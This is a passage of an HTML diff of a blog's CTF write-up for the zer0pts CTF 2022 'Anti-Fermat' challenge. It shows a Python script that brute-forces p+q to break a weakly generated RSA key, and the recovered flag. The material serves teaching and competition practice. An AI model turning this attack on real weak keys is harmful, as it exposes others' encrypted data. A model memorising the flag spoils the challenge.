+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
 </span></code></pre></td>
-<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#069;font-weight:bold">from</span> <span style="color:#0cf;font-weight:bold">Crypto.Util.number</span> <span style="color:#069;font-weight:bold">import</span> <span style="color:#555">*</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>e <span style="color:#555">=</span> <span style="color:#f60">65537</span>
-</span></span><span style="display:flex;"><span>n <span style="color:#555">=</span> <span style="color:#f60">0x1ffc7dc6b9667b0dcd00d6ae92fb34ed0f3d84285364c73fbf6a572c9081931be0b0610464152de7e0468ca7452c738611656f1f9217a944e64ca2b3a89d889ffc06e6503cfec3ccb491e9b6176ec468687bf4763c6591f89e750bf1e4f9d6855752c19de4289d1a7cea33b077bdcda3c84f6f3762dc9d96d2853f94cc688b3c9d8e67386a147524a2b23b1092f0be1aa286f2aa13aafba62604435acbaa79f4e53dea93ae8a22655287f4d2fa95269877991c57da6fdeeb3d46270cd69b6bfa537bfd14c926cf39b94d0f06228313d21ec6be2311f526e6515069dbb1b06fe3cf1f62c0962da2bc98fa4808c201e4efe7a252f9f823e710d6ad2fb974949751</span>
-</span></span><span style="display:flex;"><span>c <span style="color:#555">=</span> <span style="color:#f60">0x60160bfed79384048d0d46b807322e65c037fa90fac9fd08b512a3931b6dca2a745443a9b90de2fa47aaf8a250287e34563e6b1a6761dc0ccb99cb9d67ae1c9f49699651eafb71a74b097fc0def77cf287010f1e7bd614dccfb411cdccbb84c60830e515c05481769bd95e656d839337d430db66abcd3a869c6348616b78d06eb903f8abd121c851696bd4cb2a1a40a07eea17c4e33c6a1beafb79d881d595472ab6ce3c61d6d62c4ef6fa8903149435c844a3fab9286d212da72b2548f087e37105f4657d5a946afd12b1822ceb99c3b407bb40e21163c1466d116d67c16a2a3a79e5cc9d1f6a1054d6be6731e3cd19abbd9e9b23309f87bfe51a822410a62</span>
-</span></span><span style="display:flex;"><span>base <span style="color:#555">=</span> <span style="color:#f60">1</span><span style="color:#555">&lt;&lt;</span><span style="color:#f60">1024</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"># Bruteforce p+q value</span>
-</span></span><span style="display:flex;"><span><span style="color:#069;font-weight:bold">for</span> i <span style="color:#000;font-weight:bold">in</span> <span style="color:#366">range</span>(<span style="color:#f60">0</span>, <span style="color:#f60">10000000</span>, <span style="color:#f60">1</span>):
-</span></span><span style="display:flex;"><span>    <span style="color:#366">print</span>(<span style="color:#c30">f</span><span style="color:#c30">&#39;Curr x: </span><span style="color:#a00">{</span>i<span style="color:#a00">}</span><span style="color:#c30">&#39;</span>)
-</span></span><span style="display:flex;"><span>    phi <span style="color:#555">=</span> n <span style="color:#555">-</span> (base<span style="color:#555">+</span>i) <span style="color:#555">+</span> <span style="color:#f60">1</span>
-</span></span><span style="display:flex;"><span>    d <span style="color:#555">=</span> inverse_mod(e, phi)
-</span></span><span style="display:flex;"><span>    flag <span style="color:#555">=</span> long_to_bytes(<span style="color:#366">int</span>(<span style="color:#366">pow</span>(c, d, n)))
-</span></span><span style="display:flex;"><span>    <span style="color:#069;font-weight:bold">if</span> <span style="color:#c30">b</span><span style="color:#c30">&#39;pts&#39;</span> <span style="color:#000;font-weight:bold">in</span> flag:
-</span></span><span style="display:flex;"><span>        <span style="color:#366">print</span>(<span style="color:#c30">f</span><span style="color:#c30">&#39;Flag: </span><span style="color:#a00">{</span>flag<span style="color:#555">.</span>decode()<span style="color:#a00">}</span><span style="color:#c30">&#39;</span>)
-</span></span><span style="display:flex;"><span>        exit()
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">Crypto.Util.number</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">e</span> <span class="o">=</span> <span class="mi">65537</span>
+</span></span><span class="line"><span class="cl"><span class="n">n</span> <span class="o">=</span> <span class="mh">0x1ffc7dc6b9667b0dcd00d6ae92fb34ed0f3d84285364c73fbf6a572c9081931be0b0610464152de7e0468ca7452c738611656f1f9217a944e64ca2b3a89d889ffc06e6503cfec3ccb491e9b6176ec468687bf4763c6591f89e750bf1e4f9d6855752c19de4289d1a7cea33b077bdcda3c84f6f3762dc9d96d2853f94cc688b3c9d8e67386a147524a2b23b1092f0be1aa286f2aa13aafba62604435acbaa79f4e53dea93ae8a22655287f4d2fa95269877991c57da6fdeeb3d46270cd69b6bfa537bfd14c926cf39b94d0f06228313d21ec6be2311f526e6515069dbb1b06fe3cf1f62c0962da2bc98fa4808c201e4efe7a252f9f823e710d6ad2fb974949751</span>
+</span></span><span class="line"><span class="cl"><span class="n">c</span> <span class="o">=</span> <span class="mh">0x60160bfed79384048d0d46b807322e65c037fa90fac9fd08b512a3931b6dca2a745443a9b90de2fa47aaf8a250287e34563e6b1a6761dc0ccb99cb9d67ae1c9f49699651eafb71a74b097fc0def77cf287010f1e7bd614dccfb411cdccbb84c60830e515c05481769bd95e656d839337d430db66abcd3a869c6348616b78d06eb903f8abd121c851696bd4cb2a1a40a07eea17c4e33c6a1beafb79d881d595472ab6ce3c61d6d62c4ef6fa8903149435c844a3fab9286d212da72b2548f087e37105f4657d5a946afd12b1822ceb99c3b407bb40e21163c1466d116d67c16a2a3a79e5cc9d1f6a1054d6be6731e3cd19abbd9e9b23309f87bfe51a822410a62</span>
+</span></span><span class="line"><span class="cl"><span class="n">base</span> <span class="o">=</span> <span class="mi">1</span><span class="o">&lt;&lt;</span><span class="mi">1024</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Bruteforce p+q value</span>
+</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">10000000</span><span class="p">,</span> <span class="mi">1</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;Curr x: </span><span class="si">{</span><span class="n">i</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">phi</span> <span class="o">=</span> <span class="n">n</span> <span class="o">-</span> <span class="p">(</span><span class="n">base</span><span class="o">+</span><span class="n">i</span><span class="p">)</span> <span class="o">+</span> <span class="mi">1</span>
+</span></span><span class="line"><span class="cl">    <span class="n">d</span> <span class="o">=</span> <span class="n">inverse_mod</span><span class="p">(</span><span class="n">e</span><span class="p">,</span> <span class="n">phi</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">flag</span> <span class="o">=</span> <span class="n">long_to_bytes</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="nb">pow</span><span class="p">(</span><span class="n">c</span><span class="p">,</span> <span class="n">d</span><span class="p">,</span> <span class="n">n</span><span class="p">)))</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="sa">b</span><span class="s1">&#39;pts&#39;</span> <span class="ow">in</span> <span class="n">flag</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;Flag: </span><span class="si">{</span><span class="n">flag</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">exit</span><span class="p">()</span>
 </span></span></code></pre></td></tr></table>
 </div>
 </div><blockquote>
 <p>Flag: zer0pts{F3rm4t,y0ur_m3th0d_n0_l0ng3r_w0rks.y0u_4r3_f1r3d}</p>
 </blockquote>
-
-      </div>
-      
-        
-  <aside class="toc-container">
-    <a href="#" style="font-weight: 700; color: black;">zer0pts CTF 2022</a>
-    <div class="js-toc">
-      <details>
-          <summary>Table of Contents
-          </summary>
-          <div>
-              <nav id="TableOfContents">
-  <ul>
-    <li><a href="#modern-rome">Modern-Rome</a></li>
-  </ul>
-
-  <ul>
-    <li><a href="#anti-fermat">Anti-Fermat</a></li>
-  </ul>
-</nav>
-          </div>
-      </details>
-    </div>
-  </aside>
-
-
-      
-    </div>
-
-    
-        <div class="tags">
-            
-                <a href="https://chovid99.github.io/tags/writeup">Writeup</a>
-            
-                <a href="https://chovid99.github.io/tags/zer0pts">zer0pts</a>
-            
-                <a href="https://chovid99.github.io/tags/pwn">pwn</a>
-            
-                <a href="https://chovid99.github.io/tags/short-overflow">short-overflow</a>
-            
-                <a href="https://chovid99.github.io/tags/got-overwrite">got-overwrite</a>
-            
-                <a href="https://chovid99.github.io/tags/rsa">RSA</a>
-            
-                <a href="https://chovid99.github.io/tags/fermat">Fermat</a>
-            
-                <a href="https://chovid99.github.io/tags/crypto">crypto</a>
-            
-                <a href="https://chovid99.github.io/tags/2022">2022</a>
-            
+</div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>
+                    
+                </span>
+            </div></div>
+        <div class="post-info-line">
+            <div class="post-info-md"></div>
+            <div class="post-info-share">
+                <span><span style="margin-right: 5px">Share on</span><a href="javascript:void(0);" title="Share on Twitter" data-sharer="twitter" data-url="https://chovid99.github.io/posts/zer0pts-ctf-2022/" data-title="zer0pts CTF 2022" data-via="Chovid99" data-hashtags="Writeup,zer0pts,pwn,short-overflow,got-overwrite,RSA,Fermat,crypto,2022"><i class="fab fa-twitter fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="https://chovid99.github.io/posts/zer0pts-ctf-2022/" data-hashtag="Writeup"><i class="fab fa-facebook-square fa-fw" aria-hidden="true"></i></a></span>
+            </div>
         </div>
-    
-    
-    
-  <div id="comment">
-    
-    
-  </div>
-
-
-</section>
-
-<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
-<script src="/js/tocbot.min.js"></script>
-
-<script type="text/javascript">
-  tocbot.init({
-      
-      tocSelector: '.js-toc',
-      
-      contentSelector: '.js-toc-content',
-      headingSelector: 'h1, h2, h3',
-      orderedList: false,
-      headingLabelCallback: s => s.substr(0, s.length-2),
-      collapseDepth: 2
-  });
-  function initTOC() {
-    var windowWidth = 1316;
-    var $block_2 = $(".toc-container");
-    var lastLeft = parseFloat($block_2.css("left").slice(0, -2))*(100/($(window).width()));
-    $block_2.css("left", (lastLeft/lastWindowWidth)*$(window).width() + "vw");
-  }
-  window.onload = initTOC;
-
-  var lastWindowWidth = $(window).width();
-  $(window).resize(function() {
-    var $block_2 = $(".toc-container");
-    var lastLeft = parseFloat($block_2.css("left").slice(0, -2))*(100/($(window).width()));
-    $block_2.css("left", (lastLeft/lastWindowWidth)*$(window).width() + "vw");
-    lastWindowWidth = $(window).width();
-  });
-</script>
-
-    </main>
-    
-    <footer id="footer">
-    
-        <div id="social">
-
-
-    <a class="symbol" href="https://github.com/Chovid99" rel="me" target="_blank">
-        
-        <svg fill="#bbbbbb" width="28" height="28"  viewBox="0 0 72 72" version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
-    
-    <title>Github</title>
-    <desc>Created with Sketch.</desc>
-    <defs></defs>
-    <g id="Page-1" stroke="none" stroke-width="1" fill="none" fill-rule="evenodd">
-        <g id="Social-Icons---Rounded-Black" transform="translate(-264.000000, -939.000000)">
-            <g id="Github" transform="translate(264.000000, 939.000000)">
-                <path d="M8,72 L64,72 C68.418278,72 72,68.418278 72,64 L72,8 C72,3.581722 68.418278,-8.11624501e-16 64,0 L8,0 C3.581722,8.11624501e-16 -5.41083001e-16,3.581722 0,8 L0,64 C5.41083001e-16,68.418278 3.581722,72 8,72 Z" id="Rounded" fill="#bbbbbb"></path>
-                <path d="M35.9985,13 C22.746,13 12,23.7870921 12,37.096644 C12,47.7406712 18.876,56.7718301 28.4145,59.9584121 C29.6145,60.1797862 30.0525,59.4358488 30.0525,58.7973276 C30.0525,58.2250681 30.0315,56.7100863 30.0195,54.6996482 C23.343,56.1558981 21.9345,51.4693938 21.9345,51.4693938 C20.844,48.6864054 19.2705,47.9454799 19.2705,47.9454799 C17.091,46.4500754 19.4355,46.4801943 19.4355,46.4801943 C21.843,46.6503662 23.1105,48.9634994 23.1105,48.9634994 C25.2525,52.6455377 28.728,51.5823398 30.096,50.9649018 C30.3135,49.4077535 30.9345,48.3460615 31.62,47.7436831 C26.2905,47.1352808 20.688,45.0691228 20.688,35.8361671 C20.688,33.2052792 21.6225,31.0547881 23.1585,29.3696344 C22.911,28.7597262 22.0875,26.3110578 23.3925,22.9934585 C23.3925,22.9934585 25.4085,22.3459017 29.9925,25.4632101 C31.908,24.9285993 33.96,24.6620468 36.0015,24.6515052 C38.04,24.6620468 40.0935,24.9285993 42.0105,25.4632101 C46.5915,22.3459017 48.603,22.9934585 48.603,22.9934585 C49.9125,26.3110578 49.089,28.7597262 48.8415,29.3696344 C50.3805,31.0547881 51.309,33.2052792 51.309,35.8361671 C51.309,45.0917119 45.6975,47.1292571 40.3515,47.7256117 C41.2125,48.4695491 41.9805,49.9393525 41.9805,52.1877301 C41.9805,55.4089489 41.9505,58.0067059 41.9505,58.7973276 C41.9505,59.4418726 42.3825,60.1918338 43.6005,59.9554002 C53.13,56.7627944 60,47.7376593 60,37.096644 C60,23.7870921 49.254,13 35.9985,13" fill="#FFFFFF"></path>
-            </g>
-        </g>
-    </g>
-</svg>
-    </a>
-
-    <a class="symbol" href="https://twitter.com/Chovid99" rel="me" target="_blank">
-        
-        <svg fill="#bbbbbb" width="28" height="28" version="1.1" id="Capa_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px"
-	 width="438.536px" height="438.536px" viewBox="0 0 438.536 438.536" style="enable-background:new 0 0 438.536 438.536;"
-	 xml:space="preserve">
-<g>
-	<path d="M414.41,24.123C398.333,8.042,378.963,0,356.315,0H82.228C59.58,0,40.21,8.042,24.126,24.123
-		C8.045,40.207,0.003,59.576,0.003,82.225v274.084c0,22.647,8.042,42.018,24.123,58.102c16.084,16.084,35.454,24.126,58.102,24.126
-		h274.084c22.648,0,42.018-8.042,58.095-24.126c16.084-16.084,24.126-35.454,24.126-58.102V82.225
-		C438.532,59.576,430.49,40.204,414.41,24.123z M335.471,168.735c0.191,1.713,0.288,4.278,0.288,7.71
-		c0,15.989-2.334,32.025-6.995,48.104c-4.661,16.087-11.8,31.504-21.416,46.254c-9.606,14.749-21.074,27.791-34.396,39.115
-		c-13.325,11.32-29.311,20.365-47.968,27.117c-18.648,6.762-38.637,10.143-59.953,10.143c-33.116,0-63.76-8.952-91.931-26.836
-		c4.568,0.568,9.329,0.855,14.275,0.855c27.6,0,52.439-8.565,74.519-25.7c-12.941-0.185-24.506-4.179-34.688-11.991
-		c-10.185-7.803-17.273-17.699-21.271-29.691c4.947,0.76,8.658,1.137,11.132,1.137c4.187,0,9.042-0.76,14.56-2.279
-		c-13.894-2.669-25.598-9.562-35.115-20.697c-9.519-11.136-14.277-23.84-14.277-38.114v-0.571
-		c10.085,4.755,19.602,7.229,28.549,7.422c-17.321-11.613-25.981-28.265-25.981-49.963c0-10.66,2.758-20.747,8.278-30.264
-		c15.035,18.464,33.311,33.213,54.816,44.252c21.507,11.038,44.54,17.227,69.092,18.558c-0.95-3.616-1.427-8.186-1.427-13.704
-		c0-16.562,5.853-30.692,17.56-42.399c11.703-11.706,25.837-17.561,42.394-17.561c17.515,0,32.079,6.283,43.688,18.846
-		c13.134-2.474,25.892-7.33,38.26-14.56c-4.757,14.652-13.613,25.788-26.55,33.402c12.368-1.716,23.88-4.95,34.537-9.708
-		C357.458,149.793,347.462,160.166,335.471,168.735z"/>
-</g>
-</svg>
-
-    </a>
-
-
-</div>
-
-    
-
-    <div class="copyright">
-    
-       © Copyright 
-       2023 
-       <span class="split">
-        <svg fill="#bbbbbb" width="15" height="15" version="1.1" id="heart-15" xmlns="http://www.w3.org/2000/svg" width="15px" height="15px" viewBox="0 0 15 15">
-  <path d="M13.91,6.75c-1.17,2.25-4.3,5.31-6.07,6.94c-0.1903,0.1718-0.4797,0.1718-0.67,0C5.39,12.06,2.26,9,1.09,6.75&#xA;&#x9;C-1.48,1.8,5-1.5,7.5,3.45C10-1.5,16.48,1.8,13.91,6.75z"/>
-</svg>
-       </span>
-       Chovid99
-    
     </div>
 
-    
-</footer>
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/writeup/">Writeup</a>,&nbsp;<a href="/tags/zer0pts/">zer0pts</a>,&nbsp;<a href="/tags/pwn/">pwn</a>,&nbsp;<a href="/tags/short-overflow/">short-overflow</a>,&nbsp;<a href="/tags/got-overwrite/">got overwrite</a>,&nbsp;<a href="/tags/rsa/">rsa</a>,&nbsp;<a href="/tags/fermat/">fermat</a>,&nbsp;<a href="/tags/crypto/">crypto</a>,&nbsp;<a href="/tags/2022/">2022</a></section>
+        <section>
+            
+        </section>
+    </div>
 
+    <div class="post-nav"><a href="/posts/pragyan-ctf-2022/" class="prev" rel="prev" title="Pragyan CTF 2022"><i class="fas fa-angle-left fa-fw" aria-hidden="true"></i>Pragyan CTF 2022</a>
+            <a href="/posts/nahamcon-ctf-2022/" class="next" rel="next" title="NahamCon CTF 2022">NahamCon CTF 2022<i class="fas fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
+</div>
+</article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2019 - 2023</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="https://twitter.com/Chovid99" target="_blank">Chovid99</a></span></div>
+        </div>
+    </footer></div>
 
-
-  </body>
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
+                <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
+            </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
+                <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
+            </a>
+        </div><link rel="stylesheet" href="/lib/katex/katex.min.css"><script type="text/javascript" src="/lib/lazysizes/lazysizes.min.js"></script><script type="text/javascript" src="/lib/clipboard/clipboard.min.js"></script><script type="text/javascript" src="/lib/sharer/sharer.min.js"></script><script type="text/javascript" src="/lib/katex/katex.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/auto-render.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/copy-tex.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/mhchem.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":50},"comment":{},"math":{"delimiters":[{"display":true,"left":"$$","right":"$$"},{"display":true,"left":"\\[","right":"\\]"},{"display":true,"left":"\\begin{equation}","right":"\\end{equation}"},{"display":true,"left":"\\begin{equation*}","right":"\\end{equation*}"},{"display":true,"left":"\\begin{align}","right":"\\end{align}"},{"display":true,"left":"\\begin{align*}","right":"\\end{align*}"},{"display":true,"left":"\\begin{alignat}","right":"\\end{alignat}"},{"display":true,"left":"\\begin{alignat*}","right":"\\end{alignat*}"},{"display":true,"left":"\\begin{gather}","right":"\\end{gather}"},{"display":true,"left":"\\begin{CD}","right":"\\end{CD}"},{"display":false,"left":"$","right":"$"},{"display":false,"left":"\\(","right":"\\)"}],"strict":false}};</script><script type="text/javascript" src="/js/theme.min.js"></script><script type="text/javascript">
+            window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments);}gtag('js', new Date());
+            gtag('config', 'G-19HP521HQ9', { 'anonymize_ip': true });
+        </script><script type="text/javascript" src="https://www.googletagmanager.com/gtag/js?id=G-19HP521HQ9" async></script></body>
 </html>
